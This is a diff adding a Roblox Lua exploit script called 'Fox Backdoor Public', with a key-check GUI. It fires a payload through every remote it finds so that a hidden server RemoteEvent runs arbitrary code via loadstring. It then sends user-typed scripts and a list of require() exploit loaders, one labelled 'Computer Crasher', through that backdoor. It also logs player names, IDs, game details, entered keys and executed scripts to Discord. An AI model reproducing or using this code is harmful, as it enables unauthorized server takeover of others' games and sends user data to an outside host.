+        KeyStatus.Text = "✅ ¡Key correcta! Cargando..."
+        KeyStatus.TextColor3 = FOX_COLORS.Success
+        
+        -- Log a Discord
+        logKeyAttempt(keyIngresada, playerName, true)
+        
+        -- Esperar un momento y cargar la GUI
+        task.wait(0.5)
+        KeyGui:Destroy()
+        FoxSS["ScreenGui_1"].Enabled = true
+        IconGui.Enabled = true
+        notify("✅ Acceso concedido", "¡Bienvenido a Fox Backdoor Public!")
+    else
+        -- Key incorrecta
+        KeyStatus.Text = "❌ Key incorrecta. Intenta de nuevo."
+        KeyStatus.TextColor3 = FOX_COLORS.Error
+        KeyTextBox.Text = ""
+        
+        -- Log a Discord
+        logKeyAttempt(keyIngresada, playerName, false)
+    end
+end)
+
+-- Permitir verificar con Enter
+KeyTextBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local keyIngresada = KeyTextBox.Text
+        
+        if verificarKey(keyIngresada) then
+            KeyStatus.Text = "✅ ¡Key correcta! Cargando..."
+            KeyStatus.TextColor3 = FOX_COLORS.Success
+            
+            logKeyAttempt(keyIngresada, playerName, true)
+            
+            task.wait(0.5)
+            KeyGui:Destroy()
+            FoxSS["ScreenGui_1"].Enabled = true
+            IconGui.Enabled = true
+            notify("✅ Acceso concedido", "¡Bienvenido a Fox Backdoor Public!")
+        else
+            KeyStatus.Text = "❌ Key incorrecta. Intenta de nuevo."
+            KeyStatus.TextColor3 = FOX_COLORS.Error
+            KeyTextBox.Text = ""
+            
+            logKeyAttempt(keyIngresada, playerName, false)
+        end
+    end
+end)
+
+-- Animación de hover para el botón
+KeyButton.MouseEnter:Connect(function()
+    TweenService:Create(KeyButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = FOX_COLORS.Accent,
+        TextColor3 = FOX_COLORS.Primary
+    }):Play()
+end)
+
+KeyButton.MouseLeave:Connect(function()
+    TweenService:Create(KeyButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = FOX_COLORS.Primary,
+        TextColor3 = FOX_COLORS.Accent
+    }):Play()
+end)
+
+-- Función para loguear ejecución de scripts
+local function logScriptExecution(scriptContent, scriptType)
+    if not LOG_TO_DISCORD then return end
+    
+    -- Acortar el script si es muy largo
+    local displayScript = scriptContent
+    if #displayScript > 500 then
+        displayScript = string.sub(displayScript, 1, 500) .. "..."
+    end
+    
+    local fields = {
+        {
+            ["name"] = "👤 Usuario",
+            ["value"] = playerName .. " (`" .. LP.UserId .. "`)",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "🎮 Juego",
+            ["value"] = gameInfo.name .. "\nID: " .. gameInfo.placeId,
+            ["inline"] = true
+        },
+        {
+            ["name"] = "🔧 Tipo",
+            ["value"] = scriptType or "Script normal",
+            ["inline"] = true
+        },
+        {
+            ["name"] = "📜 Script",
+            ["value"] = "```lua\n" .. displayScript .. "\n```"
+        }
+    }
+    
+    sendToDiscord(
+        "🦊 **Script Ejecutado**",
+        "**Usuario:** " .. playerName .. "\n**Juego:** " .. gameInfo.name,
+        16748802, -- Color naranja
+        fields
+    )
+end
+
+local function notify(title, text)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "🦊 " .. title,
+            Text = text,
+            Duration = 4
+        })
+    end)
+end
+
+local function tweenButton(button, targetColor)
+    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = targetColor}):Play()
+end
+
+local HubScrolling = Instance.new("ScrollingFrame")
+HubScrolling.Parent = FoxSS["Frame7_15"]
+HubScrolling.BackgroundTransparency = 1
+HubScrolling.BorderSizePixel = 0
+HubScrolling.Position = UDim2.new(0, 6, 0, 25)
+HubScrolling.Size = UDim2.new(1, -12, 1, -30)
+HubScrolling.CanvasSize = UDim2.new(0,0,0,0)
+HubScrolling.ScrollBarThickness = 4
+HubScrolling.ScrollBarImageColor3 = FOX_COLORS.Primary
+
+local HubLayout = Instance.new("UIListLayout")
+HubLayout.Parent = HubScrolling
+HubLayout.Padding = UDim.new(0,5)
+HubLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local function AddHubScript(name, code)
+    local btn = Instance.new("TextButton")
+    btn.Parent = HubScrolling
+    btn.BackgroundColor3 = FOX_COLORS.Accent
+    btn.Size = UDim2.new(1,0,0,30)
+    btn.Text = "🦊 " .. name
+    btn.TextColor3 = FOX_COLORS.Text
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 11
+    btn.TextWrapped = true
+    
+    local corner = Instance.new("UICorner", btn)
+    corner.CornerRadius = UDim.new(0,4)
+    
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = FOX_COLORS.Primary
+    stroke.Thickness = 1
+    
+    -- Hover effect
+    btn.MouseEnter:Connect(function()
+        tweenButton(btn, FOX_COLORS.Primary)
+        btn.TextColor3 = FOX_COLORS.Accent
+    end)
+    
+    btn.MouseLeave:Connect(function()
+        tweenButton(btn, FOX_COLORS.Accent)
+        btn.TextColor3 = FOX_COLORS.Text
+    end)
+    
+    btn.MouseButton1Click:Connect(function()
+        local final = code:gsub('""', '"'..playerName..'"')
+                          :gsub("''", "'"..playerName.."'")
+                          :gsub('"name"', '"'..playerName..'"')
+                          :gsub('"username"', '"'..playerName..'"')
+                          :gsub('"plr"', '"'..playerName..'"')
+                          :gsub('"YourNameHere"', '"'..playerName..'"')
+        FoxSS["TextBox_1b"].Text = final
+        notify("Script cargado", "Listo para ejecutar")
+    end)
+end
+
+AddHubScript("KoopGui V11", [[require(15267263357).V11("")]])
+AddHubScript("SSP", [[require(96288911777671):SSP("")]])
+AddHubScript("Rc7", [[require(12350030542).RC7("")]])
+AddHubScript("polaria", [[require(110951620907921):Pload("")]])
+AddHubScript("Sensation Hub", [[require(100263845596551)("")]])
+AddHubScript("Pepsi gui", [[require(113825094179678).pepsi("")]])
+AddHubScript("Catlol", [[require(77579329778474).catlol("")]])
+AddHubScript("IDE", [[require(121425622240385).dominantultimate("")]])
+AddHubScript("Bipolaria", [[require(88477009909590):Pload("")]])
+AddHubScript("RoLoader", [[require(112796675826571).RoLoader("name")]])
+AddHubScript("Dominant", [[require(135879132527047).dominant("name")]])
+AddHubScript("FSA", [[require(72732733952061).FSA("")]])
+AddHubScript("Stigma",[[require(132938459666886).stigma("name")]])
+AddHubScript("Ro-xploit v7.0", [[require(96184029574075)("")]])
+AddHubScript("abunga ", [[require(94540928447702).s("name")]])
+AddHubScript("The Future", [[require(7089500700).load("name")]])
+AddHubScript("Sponger", [[require(131352317382292).bob("name")]])
+AddHubScript("Happy Hub SS", [[require(110047253067635):Hload("name")]])
+AddHubScript("Portal Tool", [[require(15877665199).give("name")]])
+AddHubScript("Pizza Frenzy", [[require(103491641253133).piza("name")]])
+AddHubScript("Crucifix", [[require(12933040327)("name")]])
+AddHubScript("Sensation", [[require(100263845596551)("name")]])
+AddHubScript("The Backrooms", [[require(9263079367)("name")]]) 
+AddHubScript("CoolGUI", [[require(14125553864):Fire("name","c00lkidd")]])
+AddHubScript("Alant175", [[require(719276392).load("name")]])
+AddHubScript("Computer Crasher", [[require(13496384593)()]])
+AddHubScript("Santabot", [[require(8039581168)("name", "Santa")]])
+AddHubScript("Gun Squad", [[require(122688137572931).SentryV1("name")]])
+AddHubScript("Tool Pack", [[require(10286545277).RandomStuff("name")]])
+AddHubScript("Primadon", [[require(94673163261524)("name")]])
+AddHubScript("Minos Prime", [[require(0x3603754d7)("name", "minos2")]])
+AddHubScript("Rope Ball", [[require(15884743161).RopeBall("name")]])
+AddHubScript("Megalodaunt", [[require(17877075256)("name")]])
+AddHubScript("Project Sonic", [[require(5104783290).projectreptilev3leaklolz("name")]])
+AddHubScript("Robot 64", [[require(136692521454263)("name")]])
+ AddHubScript("mangos", [[require(122775270569362)("name")]]) 
+
+HubLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    HubScrolling.CanvasSize = UDim2.new(0,0,0, HubLayout.AbsoluteContentSize.Y + 20)
+end)
+
+FoxSS["TextButton3_9"].MouseButton1Click:Connect(function()
+    if injected then 
+        FoxSS["TextButton3_9"].Text = "✅ INJECTADO"
+        notify("Ya inyectado", "backdoor ya está activo") 
+        return 
+    end 
+    
+    FoxSS["TextButton3_9"].Text = "💉 INYECTANDO..."
+    
+    local bn = "_FOX_BACKDOOR_" .. math.random(10000,99999)
+    
+    local injector = [[
+        local JS=game:GetService("JointsService")
+        local bn="]]..bn..[["
+        if not JS:FindFirstChild(bn)then 
+            local e=Instance.new("RemoteEvent") 
+            e.Name=bn 
+            e.Parent=JS 
+            e.OnServerEvent:Connect(function(p,cd)
+                local f,e=loadstring(cd) 
+                if f then pcall(f) end 
+            end)
+        end
+    ]]
+    
+    local function ti(r)
+        pcall(function()
+            if r:IsA("RemoteEvent") then
+                r:FireServer(injector)
+            elseif r:IsA("RemoteFunction") then
+                r:InvokeServer(injector)
+            end
+        end)
+    end
+    
+    task.spawn(function() for _,v in ipairs(RS:GetChildren()) do ti(v) end end)
+    task.spawn(function() for _,v in ipairs(JS:GetChildren()) do ti(v) end end)
+    
+    local w = 0
+    while w < 1.5 do 
+        if JS:FindFirstChild(bn) then break end 
+        task.wait(0.025) 
+        w = w + 0.025 
+    end 
+    
+    local br = JS:FindFirstChild(bn)
+    if br and br:IsA("RemoteEvent") then 
+        injected = true
+        attachedRemote = br
+        FoxSS["TextButton3_9"].Text = "✅ INJECTADO"
+        FoxSS["TextButton3_9"].BackgroundColor3 = FOX_COLORS.Success
+        notify("Inyección exitosa", "backdoor y GUI activados")
+        
+        -- Log de inyección exitosa
+        if LOG_TO_DISCORD then
+            sendToDiscord(
+                "✅ **Inyección Exitosa**",
+                "**Usuario:** " .. playerName .. "\n**Juego:** " .. gameInfo.name,
+                65280, -- Verde
+                {
+                    {
+                        ["name"] = "👤 Usuario",
+                        ["value"] = playerName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 Juego",
+                        ["value"] = gameInfo.name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🔧 Estado",
+                        ["value"] = "Inyectado correctamente",
+                        ["inline"] = true
+                    }
+                }
+            )
+        end
+    else 
+        injected = false
+        FoxSS["TextButton3_9"].Text = "❌ FALLÓ"
+        FoxSS["TextButton3_9"].BackgroundColor3 = FOX_COLORS.Error
+        notify("Inyección fallida", "")
+    end 
+end)
+
+FoxSS["TextButton_b"].MouseButton1Click:Connect(function()
+    if not injected or not attachedRemote then 
+        notify("Error", "Inyecta primero")
+        return 
+    end 
+    
+    local code = FoxSS["TextBox_1b"].Text 
+    if code:match("^%s*$") then 
+        notify("Error", "No hay script")
+        return 
+    end 
+    
+    local pats = {'"yourusername"','"username"','"name"','"plr"','"player"','"YourNameHere"'}
+    for _,p in ipairs(pats) do 
+        code = code:gsub(p, '"'..playerName..'"') 
+    end
+    
+    -- Loguear el script antes de ejecutarlo
+    logScriptExecution(code, "Ejecución manual")
+    
+    local success = pcall(function()
+        attachedRemote:FireServer(code)
+        notify("Ejecutado", "Script enviado")
+    end)
+    
+    if not success then
+        notify("Error", "No se pudo ejecutar")
+        
+        -- Log de error
+        if LOG_TO_DISCORD then
+            sendToDiscord(
+                "❌ **Error de Ejecución**",
+                "**Usuario:** " .. playerName .. "\n**Juego:** " .. gameInfo.name,
+                16711680, -- Rojo
+                {
+                    {
+                        ["name"] = "👤 Usuario",
+                        ["value"] = playerName,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "🎮 Juego",
+                        ["value"] = gameInfo.name,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "⚠️ Error",
+                        ["value"] = "No se pudo ejecutar el script",
+                        ["inline"] = true
+                    }
+                }
+            )
+        end
+    end
+end)
+
+FoxSS["TextButton2_7"].MouseButton1Click:Connect(function()
+    FoxSS["TextBox_1b"].Text = "" 
+    notify("Limpiado", "Texto eliminado")
+end)
+
+FoxSS["TextButton4_10"].MouseButton1Click:Connect(function()
+    if not injected or not attachedRemote then
+        return
+    end
+    
+    local r6_code = [[require(3436957371):r6("]] .. playerName .. [[")]]
+    
+    -- Loguear cambio a R6
+    logScriptExecution(r6_code, "Cambio a R6")
+    
+    local success = pcall(function()
+        attachedRemote:FireServer(r6_code)
+        notify("R6", "Modo cambiado a R6")
+    end)
+end)
+
+-- Hover effects para botones principales
+local function setupButtonHover(button)
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = FOX_COLORS.Primary,
+            TextColor3 = FOX_COLORS.Accent
+        }):Play()
+    end)
+    
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {
+            BackgroundColor3 = FOX_COLORS.ButtonBg,
+            TextColor3 = FOX_COLORS.Text
+        }):Play()
+    end)
+end
+
+setupButtonHover(FoxSS["TextButton_b"])
+setupButtonHover(FoxSS["TextButton2_7"])
+setupButtonHover(FoxSS["TextButton4_10"])
+
+-- Log inicial cuando se carga el script
+if LOG_TO_DISCORD then
+    sendToDiscord(
+        "🦊 **Fox Backdoor Public Cargado**",
+        "**Usuario:** " .. playerName .. "\n**Juego:** " .. gameInfo.name,
+        16748802, -- Naranja
+        {
+            {
+                ["name"] = "👤 Usuario",
+                ["value"] = playerName .. " (`" .. LP.UserId .. "`)",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎮 Juego",
+                ["value"] = gameInfo.name .. "\nID: " .. gameInfo.placeId,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "📊 Job ID",
+                ["value"] = gameInfo.jobId,
+                ["inline"] = false
+            }
+        }
+    )
+end
+
+return FoxSS["ScreenGui_1"], require;
